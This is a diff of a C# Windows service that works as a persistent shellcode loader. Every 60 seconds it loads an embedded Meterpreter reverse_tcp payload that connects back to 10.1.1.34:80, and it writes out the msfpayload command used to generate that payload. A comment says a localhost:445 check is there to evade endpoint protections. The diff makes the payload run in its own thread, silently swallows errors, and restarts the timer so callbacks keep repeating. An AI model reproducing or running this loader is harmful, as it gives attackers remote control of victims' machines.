@@ -5,7 +5,9 @@ using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.ServiceProcess;
+using System.Threading;
 using System.Timers;
+using Timer = System.Timers.Timer;
 
 namespace Wrapper
 {
@@ -77,6 +79,7 @@ namespace Wrapper
                              Interval = 60000 // 60 seconds
                          };
             _timer.Elapsed += RunShellCode;
+            _timer.AutoReset = true;
         }
         
         #endregion
@@ -86,13 +89,13 @@ namespace Wrapper
         protected override void OnStart(string[] args)
         {
             base.OnStart(args);
-            _timer.Enabled = true;
+            _timer.Start();
         }
 
         protected override void OnStop()
         {
             base.OnStop();
-            _timer.Enabled = false;
+            _timer.Stop();
         }
 
         #endregion
@@ -104,38 +107,52 @@ namespace Wrapper
 
         private void RunShellCode(object sender, ElapsedEventArgs e)
         {
+            _timer.Stop();
+            
             // only run shellcode if you can connect to localhost:445, due to endpoint protections
             if (ConnectToLocalhost(445))
             {
-                // msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=80 LHOST=10.1.1.34 R| msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
-                string shellcode = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIil9xlIGpc030qpk9IuUaKbBDlK3bTpNksbTLlKaBwdLKcB4hfo87rjwV019oVQkpllUlcQCLURVLEpza8Ofmc1hGZBJPaBBwNk3bdPLKBbwLs1N0LKsp48LEkpRTCzfahPbplKG8GhNkQHups1Kc8cWL2iLKFTlKgqHVVQKODqkpnLZazofmEQYWUh9p1ehtwssMih7KcMUtSExbrxnk1HgT6an356nktLPKNkBx7l5QN3Nk4DNkC1hPniCtgTtdaKske1pYaJBqIoIprxco0ZNk7bJKMVsmCX4s6RS0S0E8cGRSVRSo1DqxpL3G6F6gYon5H8Z07qePUPFIo4F4BpPhUyMPpkC0ioiE600PBppPg0BpQP2pQxYztOYOM0ioXUJ7BJtERHEZGqeQ12rHWrc07pBpmYzF3ZB01FPWe8MIleT4u1Yon5K5O03DvlioRntH3EHlbHzPLuI2PVIo9ECZ30QztDRvCgBHuRJyiXSo9oYENk4vPjw0BHWpdPEPC00VcZGp0hrxoTscyuyoHUnsF31zUPcfCc67BHERII9XsoioHUEQhC4iO6mU9f3EjLZcAA";
-
-                byte[] sc = new byte[shellcode.Length];
-
-                for (int i = 0; i < shellcode.Length; i++)
-                {
-                    sc[i] = Convert.ToByte(shellcode[i]);
-                }
-
-                // Allocate RWX memory for the shellcode
-                IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
-                System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, "Error: Couldn't allocate remote memory");
-
                 try
                 {
-                    // Copy shellcode to RWX buffer
-                    Marshal.Copy(sc, 0, baseAddr, sc.Length);
+                    // msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=80 LHOST=10.1.1.34 R| msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
+                    string shellcode = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIil9xlIGpc030qpk9IuUaKbBDlK3bTpNksbTLlKaBwdLKcB4hfo87rjwV019oVQkpllUlcQCLURVLEpza8Ofmc1hGZBJPaBBwNk3bdPLKBbwLs1N0LKsp48LEkpRTCzfahPbplKG8GhNkQHups1Kc8cWL2iLKFTlKgqHVVQKODqkpnLZazofmEQYWUh9p1ehtwssMih7KcMUtSExbrxnk1HgT6an356nktLPKNkBx7l5QN3Nk4DNkC1hPniCtgTtdaKske1pYaJBqIoIprxco0ZNk7bJKMVsmCX4s6RS0S0E8cGRSVRSo1DqxpL3G6F6gYon5H8Z07qePUPFIo4F4BpPhUyMPpkC0ioiE600PBppPg0BpQP2pQxYztOYOM0ioXUJ7BJtERHEZGqeQ12rHWrc07pBpmYzF3ZB01FPWe8MIleT4u1Yon5K5O03DvlioRntH3EHlbHzPLuI2PVIo9ECZ30QztDRvCgBHuRJyiXSo9oYENk4vPjw0BHWpdPEPC00VcZGp0hrxoTscyuyoHUnsF31zUPcfCc67BHERII9XsoioHUEQhC4iO6mU9f3EjLZcAA";
 
-                    // Get pointer to function created in memory
-                    ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));
+                    byte[] sc = new byte[shellcode.Length];
 
-                    del();
+                    for (int i = 0; i < shellcode.Length; i++)
+                    {
+                        sc[i] = Convert.ToByte(shellcode[i]);
+                    }
+
+                    // Allocate RWX memory for the shellcode
+                    IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
+                    System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, "Error: Couldn't allocate remote memory");
+
+                    try
+                    {
+                        // Copy shellcode to RWX buffer
+                        Marshal.Copy(sc, 0, baseAddr, sc.Length);
+
+                        // Get pointer to function created in memory
+                        ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));
+
+                        // Run this in a separate thread, so that we can wait for it to die before continuing the timer
+                        Thread thread = new Thread(() => del());
+
+                        thread.Start();
+                        thread.Join(); // Joins it to the main thread, so that when it ends, execution will continue with main thread
+                    }
+                    finally
+                    {
+                        VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
+                    }
                 }
-                finally
+                catch
                 {
-                    VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
+                    // Eat it
                 }
             }
+            _timer.Start();
         } 
 
         private static bool ConnectToLocalhost(int port)
